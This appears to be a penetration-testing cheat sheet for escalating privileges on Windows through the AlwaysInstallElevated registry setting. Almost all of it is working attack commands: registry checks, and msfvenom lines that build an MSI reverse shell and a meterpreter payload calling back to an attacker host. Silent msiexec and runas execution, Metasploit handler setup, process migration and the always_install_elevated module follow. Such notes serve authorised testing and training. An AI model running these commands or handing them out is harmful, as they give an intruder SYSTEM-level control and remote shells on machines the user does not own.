If both the values AlwaysInstallElevated registries are set, `.msi` files will be downloaded as the superuser.

Check AlwaysInstallElevated priveleges, both have to be `0x1` to be exploitable:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   // Current User
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   // Local Machine
```

Generate msfvenom MSI reverse shell:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi
```

Execute the reverse shell:
```
msiexec /quiet /qn /i REVERSE_SHELL_PATH
```

## Sessions
When the exploit does not work, chances are it's because it's a `session-0` type.

### Runas solution
This requires the password.
```
runas /user:USERNAME "msiexec.exe /qn /i ABSOLUTE_LOCATION"    // "/qn" --> quiet, no prompt "/i" --> install
```

### Metasploit solution
To check and/or migrate, use metasploit.
First, use your `meterpreter` shell and listener:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o meterpreter_reverse.exe
// Upload this to the machine
```

```
use exploit/multi/handler
set LHOST tun0
set LPORT 5555
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

After running the reverse shell executable, you'll get a shell back.
```
getpid // Shows meterpreter PID
ps     // Trace back the PID and Parent-PID (PPID). There you can see the session type.
```

Migration:
```
migrate ANY_SESSION_1_PROCESS    // some work, some might not
```

Backgrounding:
```
bg
search always_install_elevated
use 0
show options
set LHOST tun0
set LPORT 5555
set SESSION $SESSION   // use session from backgrounding
exploit
```